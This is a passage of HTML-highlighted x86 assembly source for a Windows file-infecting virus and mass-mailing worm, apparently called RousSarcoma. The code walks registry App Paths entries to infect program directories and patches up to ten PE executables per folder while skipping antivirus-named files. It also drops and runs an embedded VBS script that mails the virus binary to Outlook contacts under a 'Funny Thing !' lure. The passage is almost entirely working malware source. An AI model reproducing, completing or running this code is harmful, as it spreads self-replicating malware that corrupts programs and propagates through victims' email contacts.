 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegBuffer</span><span class="sc0">     </span><span class="sc1">; Value</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">                   </span><span class="sc1">; REG_DWORD</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; reserved</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Valuename</span><span class="sc0">     </span><span class="sc1">; value name</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegSetValueExA</span><span class="sc4">]</span><span class="sc0">

                           </span><span class="sc1">; Close the key</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegCloseKey</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegBuffer</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">; Now we decide what to do ( we start with 2 because we just incremented it and i will not do anything after</span><span class="sc0">
</span><span class="sc1">;                            the second start, cause we need one reboot to disable WFP ) :</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;           Value     - what to do</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;             2       - infect directory 1 of</span><span class="sc0">
</span><span class="sc1">;                       HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths</span><span class="sc0">
</span><span class="sc1">;             3       - "         "      2 "    ""</span><span class="sc0">
</span><span class="sc1">;             4       - "         "      3 "    ""</span><span class="sc0">
</span><span class="sc1">;             5       - "         "      4 "    ""</span><span class="sc0">
</span><span class="sc1">;             6       - "         "      5 "    ""</span><span class="sc0">
</span><span class="sc1">;             ... no more directorys in RegKey ?  --&amp;gt; set value to 0</span><span class="sc0">


</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoRegistryInfection</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegHandle</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">001F0000h</span><span class="sc0">            </span><span class="sc1">; complete access</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">                   </span><span class="sc1">; reserved</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AppPaths</span><span class="sc0">      </span><span class="sc1">; App Paths are stored here</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">   </span><span class="sc1">; HKEY_LOCAL_MACHINE</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegOpenKeyExA</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">255d</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NameBuffer</span><span class="sc0"> 
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; Key Number we want to retrieve</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0"> 
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegEnumKeyA</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">DropVBSWorm</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegHandle2</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">001F0000h</span><span class="sc0">            </span><span class="sc1">; complete access</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">                   </span><span class="sc1">; reserved</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NameBuffer</span><span class="sc0">    </span><span class="sc1">; App Paths are stored here</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; HKEY_LOCAL_MACHINE</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegOpenKeyExA</span><span class="sc4">]</span><span class="sc0">

                           </span><span class="sc1">; Read Vakze</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegData2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">255d</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegData2</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NameBuffer</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegData1</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PathValue</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle2</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegQueryValueExA</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle2</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegCloseKey</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NameBuffer</span><span class="sc0">        </span><span class="sc1">; Remove ; to get directory</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">';'</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">254d</span><span class="sc0">
 </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CurrentPath</span><span class="sc0">              </span><span class="sc1">; Get Current dir and save it</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">255d</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XGetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NameBuffer</span><span class="sc0">               </span><span class="sc1">; set new directory</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XSetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectCurDir</span><span class="sc0">                    </span><span class="sc1">; Infect the directory</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CurrentPath</span><span class="sc0">              </span><span class="sc1">; restore old directory</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XSetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">CloseRegInfection</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegCloseKey</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc5">NoRegistryInfection</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectCurDir</span><span class="sc0">         </span><span class="sc1">; Infect the current directory</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FirstGenHost</span><span class="sc0">


</span><span class="sc5">DropVBSWorm</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; Ok, we found no more directorys in the App Paths</span><span class="sc0">
                           </span><span class="sc1">; Registry Key, so we will drop a little VBS Script</span><span class="sc0">
                           </span><span class="sc1">; and execute it, so the virus will also spread with</span><span class="sc0">
                           </span><span class="sc1">; the help of outlook</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc0">                </span><span class="sc1">; normal attribs</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc0">                  </span><span class="sc1">; create a new file (always)</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">          </span><span class="sc1">; read + write</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VBSWorm</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XCreateFileA</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CloseRegInfection</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; save filehandle</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; write script to file</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Write</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndVBSScript</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VBSscript</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VBSscript</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">Handle</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XWriteFile</span><span class="sc4">]</span><span class="sc0">


                          </span><span class="sc1">; Handle is still on the stack, so we close the file</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XCloseHandle</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; let's execute the wormy script</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ProcessInformation</span><span class="sc0"> 
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StartupInfo</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; lpCurrentDirectory</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; lpEnvironment  </span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; Create_New_Process_Group &amp;amp; Normal_Priority_Class</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; bInheritHandles</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; lpThreadAttributes</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; lpProcessAttributes</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VBSWorm</span><span class="sc0">       </span><span class="sc1">; filename with commandline</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; command line</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XCreateProcessA</span><span class="sc4">]</span><span class="sc0">


 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CloseRegInfection</span><span class="sc0">

</span><span class="sc5">VBSscript</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'On Error Resume Next'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Dim R'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set RS=CreateObject("Outlook.Application")'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'For R=1 To 500'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set Mail=RS.CreateItem(0)'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Mail.to=RS.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Mail.Subject="Funny Thing !"'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Mail.Body="Take a look at this and just start laughing !"'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Mail.Attachments.Add("C:\RousSarc.EXE")'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Mail.Send'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Next'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RS.Quit'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
</span><span class="sc5">EndVBSScript</span><span class="sc4">:</span><span class="sc0">
 
 </span><span class="sc5">VBSWorm</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'C:\RousSarc.vbs'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">AppPaths</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">PathValue</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Path'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">RegData2</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">          </span><span class="sc1">; Bytes to read in Buffer</span><span class="sc0">
 </span><span class="sc5">RegBuffer</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">          </span><span class="sc1">; Buffer</span><span class="sc0">
 </span><span class="sc5">Valuename</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RousSarcoma'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">MyKey</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RousSarcoma'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">RegHandle2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
 



</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; --------------------------[ Infection current dir ]------------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">

                           </span><span class="sc1">; We got all we need</span><span class="sc0">
                           </span><span class="sc1">; let's party ;)</span><span class="sc0">
</span><span class="sc5">InfectCurDir</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; Infect up to 10 files in the current directory</span><span class="sc0">
                           </span><span class="sc1">; use FindFirstFile / Next to find files</span><span class="sc0">
                           </span><span class="sc1">; 10 files at max.</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InfCounter</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">


 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filemask</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindFirstFileProc</span><span class="sc0">

 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">EndInfectCurDir1</span><span class="sc0">       </span><span class="sc1">; did we get all ?</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">InfectCurDirFile</span><span class="sc4">:</span><span class="sc0">
                           </span><span class="sc1">; Filename in esi</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectFile</span><span class="sc0">           </span><span class="sc1">; Try it !</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InfCounter</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
 </span><span class="sc6">jna</span><span class="sc0"> </span><span class="sc5">EndInfectCurDir2</span><span class="sc0">

 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindNextFileProc</span><span class="sc0">

 </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">InfectCurDirFile</span><span class="sc0">
 
</span><span class="sc5">EndInfectCurDir2</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">; close Search - Handle</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XFindClose</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">EndInfectCurDir1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; -------------------------[ prepare Infection  ]----------------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">

</span><span class="sc5">InfectFile</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; filename is in WFD_szFileName</span><span class="sc0">
                           </span><span class="sc1">; esi shows to this value</span><span class="sc0">

 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AVNameCheck</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">NoInfection</span><span class="sc0">

 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc0">
 
                           </span><span class="sc1">; ignore files smaller than 20000 Bytes</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20000d</span><span class="sc0">
 </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">NoInfection</span><span class="sc0">
                           </span><span class="sc1">; ignore files bigger than 4,3 GB</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WFD_nFileSizeHigh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoInfection</span><span class="sc0">

 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenFile</span><span class="sc0">             </span><span class="sc1">; Open File</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">NoInfection</span><span class="sc0">            </span><span class="sc1">; stop if there are problems</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckMZSign</span><span class="sc0">          </span><span class="sc1">; Check for DOS-Stub</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Notagoodfile</span><span class="sc0">

 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Notagoodfile</span><span class="sc0">

 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">              </span><span class="sc1">; get PE-Header</span><span class="sc0">
